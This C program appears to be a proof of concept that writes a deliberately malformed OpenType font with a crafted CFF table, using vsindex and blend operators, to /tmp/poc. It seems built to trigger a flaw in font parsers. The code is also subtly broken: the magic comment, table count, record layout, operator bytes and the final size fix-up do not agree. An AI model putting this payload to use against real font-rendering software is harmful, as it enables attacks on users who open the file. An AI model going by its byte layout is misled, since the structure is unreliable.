#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType SFNT header */
    unsigned char sfnt[12] = {
        0x00, 0x01, 0x00, 0x00,  /* OTTO magic */
        0x00, 0x04, 0x00, 0x00,  /* numTables = 4 */
        0x00, 0x00, 0x00, 0x00   /* searchRange, entrySelector, rangeShift */
    };
    fwrite(sfnt, 1, 12, f);

    /* Table Record: CFF */
    unsigned char cff_tag[4] = {'C', 'F', 'F', ' '};
    fwrite(cff_tag, 1, 4, f);
    unsigned int cff_offset = 12 + 16 * 4; /* after all table records */
    unsigned int cff_size = 0; /* will fill later */
    fwrite(&cff_offset, 4, 1, f);
    fwrite(&cff_size, 4, 1, f);

    /* CFF data */
    /* Header */
    fputc(0x01, f);
    fputc(0x00, f);
    fputc(0x04, f);
    fputc(0x01, f);

    /* Name INDEX (empty) */
    fputc(0x00, f);

    /* Top DICT INDEX */
    fputc(0x01, f); /* count = 1 */
    fputc(0x01, f); /* offSize = 1 */
    fputc(0x01, f); /* offset[0] = 1 */
    fputc(0x06, f); /* offset[1] = 6 (5 bytes data) */

    /* Top DICT data: 5 bytes */
    fputc(0x01, f); /* push 1 (CharStrings offset) */
    fputc(0x11, f); /* CharStrings operator (17) */
    fputc(0x01, f); /* push 1 (Private size) */
    fputc(0x01, f); /* push 1 (Private offset) */
    fputc(0x12, f); /* Private operator (18) */

    /* String INDEX (empty) */
    fputc(0x00, f);

    /* Global Subr INDEX (empty) */
    fputc(0x00, f);

    /* Encodings (default) */
    fputc(0x00, f);

    /* Private DICT */
    /* vsindex: set design space (0) */
    fputc(0x8B, f); /* push 0 */
    fputc(0x0C, f); /* vsindex */
    fputc(0x0E, f);

    /* First blend: push 0,0,0,0,0,2, then blend */
    fputc(0x8B, f); /* 0 */
    fputc(0x8B, f); /* 0 */
    fputc(0x8B, f); /* 0 */
    fputc(0x8B, f); /* 0 */
    fputc(0x8B, f); /* 0 */
    fputc(0x8D, f); /* 2 */
    fputc(0x0C, f); /* blend */
    fputc(0x16, f);

    /* Second blend: same */
    fputc(0x8B, f); /* 0 */
    fputc(0x8B, f); /* 0 */
    fputc(0x8B, f); /* 0 */
    fputc(0x8B, f); /* 0 */
    fputc(0x8B, f); /* 0 */
    fputc(0x8D, f); /* 2 */
    fputc(0x0C, f); /* blend */
    fputc(0x16, f);

    fputc(0x0E, f); /* END */

    /* CharStrings INDEX (empty) */
    fputc(0x00, f);

    /* Update CFF size and offset in table record */
    fseek(f, 16, SEEK_SET);
    unsigned int cff_end = ftell(f);
    fwrite(&cff_offset, 4, 1, f);
    fwrite(&cff_end, 4, 1, f);

    fclose(f);
    return 0;
}